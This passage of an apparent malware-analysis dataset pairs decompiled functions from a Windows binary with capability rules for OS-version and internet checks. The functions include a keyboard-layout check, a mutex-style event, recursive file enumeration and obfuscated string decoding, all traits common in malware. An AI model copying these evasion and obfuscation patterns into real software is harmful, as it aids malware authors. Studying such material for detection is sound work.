        "decompiled_code": "\nvoid fcn.00407bcd(uint param_1, uint param_2)\n\n{\n    if (*0x41c6b2 != '\\0') {\n        fcn.00407b4a(param_1, param_2);\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "00408300": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00408300(uint arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    int64_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uVar1 = fcn.0040a88f(0x4187e8, 5, 0x51c9fd1e, 0);\n    uVar2 = fcn.00415506(uVar1);\n    if (uVar2 != 0) {\n        uVar1 = fcn.0040a88f(0x4187f0, 2, 0xcde34f5d, 0);\n        fcn.00415506(uVar1);\n        iVar5 = fcn.004155c2();\n        uVar2 = iVar5 | iVar5 >> 0x20;\n        if (iVar5 != 0) {\n            uVar1 = fcn.0040a88f(0x4187f4, 0xc, 0x4a9d88de, 0);\n            uVar2 = fcn.00415506(uVar1);\n            if (uVar2 != 0) {\n                uVar1 = fcn.0040acd8(0x418804, 0x15, 0x65af161f, extraout_ECX, 0);\n                uVar1 = fcn.0040acd8(0x41881c, 0x29, 0x7531b76b, uVar1);\n                arg_ch = fcn.0040a6f9(uVar1);\n                uVar1 = fcn.0040acd8(0x418848, 0xf, 0xd84f7825, extraout_ECX_00, 0);\n                uVar1 = fcn.0040acd8(0x41881c, 0x29, 0x7531b76b, uVar1);\n                uVar1 = fcn.0040a6f9(uVar1);\n                uVar2 = fcn.004154a9();\n                var_8h = 0;\n                if (uVar2 != 0) {\n                    do {\n                        fcn.004154d0(var_8h);\n                        iVar3 = fcn.00415629();\n                        if (iVar3 != 0) {\n                            if (arg_ch != 0) {\n                                uVar4 = fcn.0040a88f(0x417b60, 5, 0xb4d7cbf9, 0);\n                                iVar3 = fcn.0040bf4f(uVar4, arg_ch);\n                                if (iVar3 != 0) {\n                                    iVar3 = fcn.0040cbeb(var_14h);\n                                    if (iVar3 != 0) {\n                                        var_1h._0_1_ = 1;\n                                    }\n                                    fcn.0040af12();\n                                }\n                            }\n                            if (var_1h != 0) break;\n                            uVar4 = fcn.0040a88f(0x417b60, 5, 0xb4d7cbf9, 0);\n                            iVar3 = fcn.0040bf4f(uVar4, uVar1);\n                            if (iVar3 != 0) {\n                                iVar3 = fcn.0040cbeb(var_18h);\n                                if (iVar3 != 0) {\n                                    var_1h._0_1_ = 1;\n                                }\n                                fcn.0040af12();\n                                if (var_1h != 0) break;\n                            }\n                        }\n                        var_8h = var_8h + 1;\n                    } while (var_8h < uVar2);\n                }\n                fcn.0040af12();\n                uVar2 = fcn.0040af12();\n            }\n        }\n    }\n    return uVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 994
    },
    "00408553": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00408553(uint arg_8h)\n\n{\n    code *pcVar1;\n    ushort uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    uVar3 = fcn.0040a88f(0x418858, 9, 0x319e5651, 0);\n    iVar4 = fcn.00415506(uVar3);\n    if (iVar4 != 0) {\n        uVar3 = fcn.0040a88f(0x418864, 9, 0x8b9d2928, 0);\n        iVar4 = fcn.00415506(uVar3);\n        if (iVar4 != 0) {\n            var_8h = fcn.004154a9();\n            var_ch = fcn.0040ae05(8);\n            uVar7 = 0;\n            if (var_8h != 0) {\n                do {\n                    fcn.004154d0(uVar7);\n                    uVar2 = fcn.004155c2();\n                    *(var_ch + uVar7 * 2) = uVar2;\n                    uVar7 = uVar7 + 1;\n                } while (uVar7 < var_8h);\n            }\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetKeyboardLayoutList;\n    var_1h._0_1_ = false;\n    iVar4 = (*_sym.imp.USER32.dll_GetKeyboardLayoutList)(0, 0);\n    if ((iVar4 != 0) && (iVar5 = fcn.0040ae05(0),  iVar5 != 0)) {\n        var_1h._0_1_ = false;\n        uVar7 = (*pcVar1)(iVar4, iVar5);\n        uVar8 = 0;\n        if (uVar7 != 0) {\n            do {\n                uVar6 = 0;\n                if (var_8h != 0) {\n                    do {\n                        if (*(iVar5 + uVar8 * 4) == *(var_ch + uVar6 * 2)) {\n                            var_1h._0_1_ = true;\n                            goto code_r0x00408638;\n                        }\n                        uVar6 = uVar6 + 1;\n                    } while (uVar6 < var_8h);\n                }\n                uVar8 = uVar8 + 1;\n            } while (uVar8 < uVar7);\n        }\ncode_r0x00408638:\n        var_1h._0_1_ = !var_1h._0_1_;\n        fcn.0040af12();\n    }\n    uVar7 = fcn.0040af12();\n    return uVar7 & 0xffffff00 | var_1h._0_1_;\n}\n",
        "token_count": 716
    },
    "004088ff": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.004088ff(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    bVar5 = false;\n    uVar1 = fcn.004087a4(param_1);\n    uVar6 = 0;\n    uVar3 = uVar1;\n    if (uVar1 != 0) {\n        uVar2 = fcn.0040a88f(0x418858, 9, 0x319e5651, 0);\n        uVar3 = fcn.00415506(uVar2);\n        if (uVar3 != 0) {\n            uVar2 = fcn.0040a88f(0x418894, 9, 0xb8ab48d0, 0);\n            uVar3 = fcn.00415506(uVar2);\n            if (uVar3 != 0) {\n                bVar5 = false;\n                uVar4 = fcn.004154a9();\n                uVar3 = uVar4;\n                if (uVar4 != 0) {\n                    do {\n                        uVar7 = uVar6;\n                        uVar3 = fcn.004154d0(uVar6);\n                        if (uVar3 != 0) {\n                            uVar2 = fcn.00415629(uVar7, uVar1);\n                            uVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(uVar2);\n                            if (uVar3 == 0) {\n                                bVar5 = true;\n                                break;\n                            }\n                        }\n                        uVar6 = uVar6 + 1;\n                    } while (uVar6 < uVar4);\n                }\n                bVar5 = !bVar5;\n            }\n        }\n    }\n    return uVar3 & 0xffffff00 | bVar5;\n}\n",
        "token_count": 442
    },
    "004089f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.004089f8(void)\n\n{\n    uint32_t in_EAX;\n    uint uVar1;\n    int64_t iVar2;\n    \n    if (*0x41e3f3 == '\\0') {\n        uVar1 = fcn.0040acd8(0x4188a0, 0x18, 0xa296fc14);\n        in_EAX = fcn.0040cbc0(uVar1);\n        if (in_EAX == 0) {\n            uVar1 = fcn.0040a88f(0x4188bc, 5, 0x25223e6c, 0);\n            fcn.00415506(uVar1);\n            iVar2 = fcn.004155c2();\n            in_EAX = iVar2 | iVar2 >> 0x20;\n            *0x41e3f2 = 1;\n            if (iVar2 == 0) {\n                *0x41e3f2 = 0;\n            }\n        }\n        else {\n            *0x41e3f2 = 1;\n        }\n        *0x41e3f3 = '\\x01';\n    }\n    return in_EAX & 0xffffff00 | *0x41e3f2;\n}\n",
        "token_count": 279
    },
    "00409073": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00409073(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x41de28 == 0) {\n        fcn.00405e79(0x41de28);\n    }\n    (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 1, 1, 0x41de28);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    return uVar1 & 0xffffff00 | uVar1 != 0xb7;\n}\n",
        "token_count": 117
    },
    "00409ab5": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00409ab5(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    piVar1 = fcn.0040ae05(8);\n    if (piVar1 != NULL) {\n        uVar2 = fcn.004154a9();\n        var_4h = 0;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = fcn.004154d0(var_4h);\n                if (iVar3 != 0) {\n                    iVar3 = fcn.0040ae72();\n                    piVar1[1] = iVar3;\n                    uVar4 = fcn.00415629();\n                    if (arg_ch == 1) {\n                        arg_8h_00 = fcn.0040acd8(0x418b30, 4, 0x18f45f1b, 0);\n                        fcn.0040beef(arg_8h_00, uVar4);\n                    }\n                    else {\n                        uVar4 = fcn.0040d63e(uVar4);\n                        *(piVar1[1] + *piVar1 * 4) = uVar4;\n                    }\n                    *piVar1 = *piVar1 + 1;\n                }\n                var_4h = var_4h + 1;\n            } while (var_4h < uVar2);\n        }\n        if (*piVar1 == 0) {\n            fcn.0040af12();\n            piVar1 = NULL;\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 401
    },
    "0040a317": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a317(uint32_t arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int16_t *piVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int16_t *piVar10;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    if (arg_8h != 0) {\n        piVar7 = in_EAX + 8;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41d8e0, 0);\n            if (iVar4 == 0) break;\n            for (piVar6 = *piVar7 + piVar7[1] * 2; piVar2 = piVar6,  *piVar6 != 0x2e; piVar6 = piVar6 + -1) {\n            }\n            do {\n                piVar10 = piVar2;\n                piVar2 = piVar10 + -1;\n            } while (piVar10[-1] != 0x5c);\n            cVar3 = fcn.00409a7d(piVar10);\n            if ((cVar3 == '\\0') && (var_4h = 0,  *0x41df54 != 0)) {\ncode_r0x0040a392:\n                cVar3 = fcn.00409a7d(piVar6);\n                if (cVar3 == '\\0') goto code_r0x0040a3a8;\n                if (*0x41de24 == piVar10 - *piVar7 >> 1) {\n                    (*_sym.imp.SHLWAPI.dll_StrCmpNIW)(*piVar7, 0x41df60, *0x41de24);\n                }\n                fcn.0040a20c(piVar7 + -2);\n                uVar9 = 0;\n                iVar5 = 0;\n                iVar4 = 0;\n                if (*0x41df54 != 0) {\n                    do {\n                        iVar1 = **(arg_ch + uVar9 * 4);\n                        iVar8 = iVar4;\n                        if ((iVar1 != 0) && (iVar8 = iVar4 + 1,  iVar4 == *0x41e168)) {\n                            iVar5 = iVar5 + iVar1;\n                        }\n                        uVar9 = uVar9 + 1;\n                        iVar4 = iVar8;\n                    } while (uVar9 < *0x41df54);\n                }\n                *arg_10h = iVar5;\n                goto code_r0x0040a44a;\n            }\ncode_r0x0040a3b6:\n            fcn.0040af12();\n            piVar7[-2] = 0;\n            piVar7[-1] = 0;\n            *piVar7 = 0;\n            piVar7[1] = 0;\ncode_r0x0040a44a:\n            var_ch = var_ch + 1;\n            piVar7 = piVar7 + 4;\n        } while (var_ch < arg_8h);\n    }\n    uVar9 = 0;\n    if (*0x41df54 != 0xffffffff) {\n        do {\n            fcn.0040a2f7();\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < *0x41df54 + 1);\n    }\n    return;\ncode_r0x0040a3a8:\n    var_4h = var_4h + 1;\n    if (*0x41df54 <= var_4h) goto code_r0x0040a3b6;\n    goto code_r0x0040a392;\n}\n",
        "token_count": 894
    },
    "0040a605": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a605(uint param_1)\n\n{\n    uint uVar1;\n    uint *arg_ch;\n    uint *arg_ch_00;\n    uint var_c8h;\n    \n    if (*0x41e170 == 0) {\n        arg_ch = &var_c8h;\n        uVar1 = fcn.0040acd8(0x418bc8, 0x10, 0x91d4c538, param_1);\n        fcn.0040c52a(uVar1, arg_ch);\n        arg_ch_00 = &var_c8h;\n        uVar1 = fcn.0040acd8(str.y_., 0x14, 0x2dd3cd17, arg_ch);\n        fcn.0040beef(uVar1, arg_ch_00);\n    }\n    return *0x41e170;\n}\n",
        "token_count": 197
    },
    "0040a88f": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a88f(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    bool bVar10;\n    uint8_t uStack21;\n    uint32_t uStack20;\n    int32_t iStack16;\n    \n    cVar2 = fcn.0040f8eb(arg_8h);\n    if (cVar2 == '\\0') {\n        cVar2 = fcn.0040a7b7();\n        *0x41bb18 = *0x41bb18 + cVar2 * 0x3e;\n        iStack16 = 0;\n    }\n    else {\n        iStack16 = 0;\n        *0x41bb18 = 0;\n        fcn.0040a83a();\n        fcn.0040a7b7();\n        iVar4 = fcn.0040d9de();\n        cVar2 = fcn.0040a7f8(0x458c);\n        *0x41bb18 = cVar2;\n        fcn.0040f6f5();\n        *0x41bb18 = 0;\n        cVar2 = fcn.0040a7f8(0x458c);\n        piVar5 = *0x41e400;\n        *0x41bb18 = *0x41bb18 + cVar2;\n        uVar3 = fcn.0040a7b7();\n        *0x41bb18 = *0x41bb18 >> (uVar3 & 0x1f);\n        for (; piVar5 != NULL; piVar5 = piVar5[4]) {\n            cVar2 = fcn.0040a7b7();\n            if (cVar2 < uStack20) {\n                uVar3 = fcn.0040a7b7();\n                if ((((*0x41bb18 & 0x11) < uVar3) && (*0x41bb18 == 0x45b0)) &&\n                   (cVar2 = fcn.0040a7b7(),  uStack20 != cVar2)) {\n                    cVar2 = fcn.0040a7f8(0x458c);\n                    uStack20 = uStack20 & cVar2 - 0x4bU;\n                }\n                else {\n                    *0x41bb18 = *0x41bb18 + 0x458c000;\n                }\n            }\n            else {\n                uVar3 = fcn.0040a7b7();\n                *0x41bb18 = *0x41bb18 >> (uVar3 & 0x1f);\n            }\n            if (*piVar5 == iVar4) {\n                cVar2 = fcn.0040a7f8(0x77cc);\n                if ((cVar2 < 0x458d) && ((*0x41bb18 != 0x458c || (uStack20 == 0x45fd)))) {\n                    if ((*0x41bb18 & 200) == 0x458c) {\n                        *0x41bb18 = *0x41bb18 ^ 0x45f4;\n                    }\n                    else {\n                        *0x41bb18 = *0x41bb18 + 0x1a9f98;\n                    }\n                }\n                else {\n                    *0x41bb18 = 0;\n                }\n                break;\n            }\n            fcn.0040a7f8(0x5087);\n        }\n        fcn.0040a7b7();\n        if (piVar5 == NULL) {\n            piVar5 = fcn.0040ae05(8);\n            cVar2 = fcn.0040a7f8(0x458c);\n            *0x41bb18 = *0x41bb18 + cVar2 * -0x6d;\n            if (piVar5 != NULL) {\n                if (*0x41bb18 == 0x30a0e4) {\n                    *0x41bb18 = 0x30a0e4 << (iVar4 + 0x84U & 0x1f);\n                }\n                else {\n                    fcn.0040a7b7();\n                    fcn.0040a7b7();\n                }\n                *piVar5 = iVar4;\n                cVar2 = fcn.0040a7b7();\n                piVar7 = *0x41e400;\n                *0x41bb18 = *0x41bb18 - (cVar2 | 0xbU);\n                if (*0x41e400 == NULL) {\n                    cVar2 = fcn.0040a7b7();\n                    *0x41bb18 = *0x41bb18 ^ cVar2 * 0xe4;\n                    *0x41e400 = piVar5;\n                }\n                else {\n                    cVar2 = fcn.0040a7f8(0x55b7);\n                    uStack20 = uStack20 & cVar2 + 7U;\n                    while (piVar7[4] != NULL) {\n                        fcn.0040a7f8(0x1371);\n                        piVar7 = piVar7[4];\n                        uVar8 = fcn.0040a7f8(0x458c);\n                        *0x41bb18 = *0x41bb18 - (uVar8 & 0x6f);\n                    }\n                    piVar7[4] = piVar5;\n                    cVar2 = fcn.0040a7f8(0x458c);\n                    *0x41bb18 = *0x41bb18 & cVar2;\n                }\n                iVar4 = fcn.0040ae05(0);\n                piVar5[2] = iVar4;\n                iVar4 = 6;\n                do {\n                    iVar4 = iVar4 + -1;\n                    *0x41bb18 = 0;\n                } while (iVar4 != 0);\n                if (piVar5[2] != 0) {\n                    *0x41bb18 = 0;\n                    fcn.0040b824(&arg_10h, 4, arg_8h, arg_ch, piVar5[2]);\n                    fcn.0040a7f8(0x1f09);\n                    *(arg_ch + piVar5[2]) = 0;\n                    fcn.0040a7f8(0x458c);\n                }\n            }\n        }\n        cVar2 = fcn.0040a7f8(0x458c);\n        *0x41bb18 = *0x41bb18 ^ cVar2 * 0x2c;\n        uVar8 = 0;\n        if (piVar5 != NULL) {\n            fcn.0040a7b7();\n            if (arg_14h == '\\0') {\n                *0x41bb18 = 0x458c;\n                iStack16 = piVar5[2];\n                fcn.0040a7f8(0x623e);\n            }\n            else {\n                fcn.0040a7f8(0x3c39);\n                if (piVar5[3] == 0) {\n                    uVar6 = fcn.0040a7f8(0x458c);\n                    uStack20 = uVar6 & 0x5b;\n                    iVar4 = fcn.0040d63e(piVar5[2]);\n                    piVar5[3] = iVar4;\n                }\n                fcn.0040a7f8(0x458c);\n                iStack16 = piVar5[3];\n                uStack20 = uStack20 | 0x11630;\n            }\n            cVar2 = fcn.0040a7f8(0x458c);\n            if (((cVar2 != (uStack21 ^ 0x54)) && (uVar3 = fcn.0040a7f8(0x458c),  uVar3 < (*0x41bb18 & 0x28))) &&\n               (uStack21 != *0x41bb18)) {\n                iVar4 = 0;\n                do {\n                    do {\n                        cVar2 = fcn.0040a7b7();\n                        *0x41bb18 = *0x41bb18 + cVar2 * -0xaf;\n                        bVar9 = 0xfffffffe < uVar8;\n                        uVar8 = uVar8 + 1;\n                        bVar10 = SCARRY4(iVar4, 0);\n                        bVar1 = SCARRY4(iVar4, bVar9);\n                        iVar4 = iVar4 + bVar9;\n                    } while (iVar4 < 0);\n                } while ((iVar4 == 0 || (bVar10 != bVar1) != iVar4 < 0) && (uVar8 < 5));\n            }\n        }\n        uVar8 = 0;\n        iVar4 = 0;\n        do {\n            if ((*0x41bb18 < 0x45bf) && (cVar2 = fcn.0040a7f8(0x386d),  uStack20 - 0xa1 <= cVar2)) {\n                cVar2 = fcn.0040a7f8(0x111e);\n                *0x41bb18 = cVar2 >> 7;\n            }\n            else {\n                *0x41bb18 = *0x41bb18 ^ 0x458c;\n            }\n            bVar9 = 0xfffffffe < uVar8;\n            uVar8 = uVar8 + 1;\n            bVar10 = SCARRY4(iVar4, 0);\n            bVar1 = SCARRY4(iVar4, bVar9);\n            iVar4 = iVar4 + bVar9;\n        } while ((iVar4 < 0) || ((iVar4 == 0 || (bVar10 != bVar1) != iVar4 < 0 && (uVar8 < 4))));\n        cVar2 = fcn.0040a7b7();\n        *0x41bb18 = *0x41bb18 >> (cVar2 + 0x67U & 0x1f);\n        fcn.0040f763();\n        iVar4 = 6;\n        do {\n            *0x41bb18 = *0x41bb18 | 0x4642;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    return iStack16;\n}\n",
        "token_count": 2388
    },
    "0040b186": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040b186(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_77h;\n    uint var_58h;\n    uint var_44h;\n    uint16_t var_2eh;\n    uint var_2ch;\n    uint var_1h;\n    \n    uVar2 = arg_8h;\n    uVar1 = *0x41e3fd;\n    if (((uVar1 <= uVar2) && (uVar2 <= uVar1)) || ((uVar2 ^ 0x73) < uVar1)) {\n        *0x41e3fd = uVar1 != uVar2;\n    }\n    var_1h._0_1_ = '\\x05';\n    do {\n        uVar1 = arg_8h;\n        if (((uVar1 + 0x10 < var_44h) || ((var_58h ^ 0xf0) <= *0x41e3fd)) || (var_2eh < (uVar1 | 0x41))) {\n            uVar2 = *0x41e3fd;\n            if ((uVar2 < *0x41b13c) || (uVar1 != uVar2)) {\n                if ((uVar2 < uVar1) || (uVar1 < (var_2ch | 0x20))) {\n                    arg_8h._0_1_ = arg_8h << (var_77h + 0x61U & 0x1f);\n                }\n            }\n            else {\n                arg_8h._0_1_ = arg_8h | *0x41b81c;\n            }\n        }\n        var_1h._0_1_ = var_1h + -1;\n    } while ('\\0' < var_1h);\n    uVar1 = *0x41e3fd;\n    if (((*0x41b13c ^ 0xb5U) <= uVar1) || ((uVar2 = arg_8h,  uVar2 == uVar1 && (*0x41b13c < uVar1)))) {\n        *0x41e3fd = arg_8h * uVar1 != 0;\n        uVar2 = arg_8h * uVar1 & 0xffffff00;\n    }\n    return uVar2 & 0xffff0000 | *0x41b13c;\n}\n",
        "token_count": 570
    },
    "0040b261": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040b261(char param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    iVar4 = *0x41b13c;\n    uVar3 = param_1;\n    *0x41e3fd = ((*0x41e3fd * iVar4 != 0) >> (*0x41b13c * -0x1b & 0x1fU) != 0) * (uVar3 | 0x29) != 0;\n    uVar1 = *0x41e3fd;\n    if ((((iVar4 < uVar1) && (uVar1 < uVar3 >> 7)) || (uVar1 <= iVar4 * 0xb9)) &&\n       (((param_1 != '\\0' && (*0x41b13c < 1)) && ((uVar3 << 0x11 < 1 && (uVar3 * 0x44 < uVar1)))))) {\n        iVar2 = 5;\n        do {\n            *0x41e3fd = *0x41e3fd * iVar4 != 0;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0x47ff;\n}\n",
        "token_count": 297
    },
    "0040ce9e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040ce9e(void)\n\n{\n    int16_t *in_EAX;\n    \n    if (((in_EAX != NULL) && (*in_EAX == 0x2e)) && ((in_EAX[1] == 0 || ((in_EAX[1] == 0x2e && (in_EAX[2] == 0)))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0040cec3": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040cec3(uint arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, code *arg_18h, uint arg_1ch, \n            int32_t arg_20h, int32_t arg_24h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint lpFileName;\n    uint var_258h;\n    uint32_t lpFindFileData;\n    uint pszFile;\n    int32_t hFindFile;\n    \n    if ((((arg_10h != 0) && (cVar2 = fcn.0040f898(arg_8h),  cVar2 != '\\0')) &&\n        (cVar2 = fcn.0040f84a(arg_ch, arg_10h << 2),  cVar2 != '\\0')) &&\n       ((cVar2 = fcn.0040f82d(arg_18h),  cVar2 != '\\0' && (cVar2 = fcn.0040ce72(&lpFileName, arg_8h),  cVar2 != '\\0'))))\n    {\n        sub.ntdll.dll_memset(&lpFindFileData, 0, 0x250);\n        var_258h = 1;\n        hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(&lpFileName, &lpFindFileData);\n        pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n        if (hFindFile != -1) {\n            do {\n                cVar2 = fcn.0040ce9e();\n                if (cVar2 == '\\0') {\n                    if (((((lpFindFileData & 0x10) != 0) && ((arg_14h & 2) != 0)) ||\n                        (((lpFindFileData & 0x10) == 0 && ((arg_14h & 4) != 0)))) && (uVar4 = 0,  arg_10h != 0)) {\n                        do {\n                            iVar3 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, *(arg_ch + uVar4 * 4));\n                            if (iVar3 != 0) {\n                                iVar3 = (*arg_18h)(arg_8h, &var_258h, arg_1ch);\n                                if (iVar3 == 0) {\n                                    var_258h = 0;\n                                    goto code_r0x0040d06b;\n                                }\n                                if (arg_24h != 0) {\n                                    (*pcVar1)(arg_24h);\n                                }\n                                break;\n                            }\n                            uVar4 = uVar4 + 1;\n                        } while (uVar4 < arg_10h);\n                    }\n                    if ((((lpFindFileData & 0x10) != 0) && ((arg_14h & 1) != 0)) &&\n                       (cVar2 = fcn.0040ce72(&lpFileName, arg_8h),  cVar2 != '\\0')) {\n                        if (arg_20h != 0) {\n                            (*pcVar1)(arg_20h);\n                        }\n                        fcn.0040cec3(&lpFileName, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h);\n                    }\n                }\n                iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n            } while (iVar3 != 0);\ncode_r0x0040d06b:\n            (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n        }\n    }\n    return;\n}\n",
        "token_count": 829
    },
    "0040d492": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d492(uint lpWideCharStr, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    if (in_EAX == 0) {\n        in_EAX = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpWideCharStr);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0x4e3, 0x200, lpWideCharStr, in_EAX);\n    if (arg_ch != 0) {\n        if (arg_ch < uVar1) {\n            uVar1 = 0;\n        }\n        *(uVar1 + unaff_ESI) = 0;\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "0040d4d1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
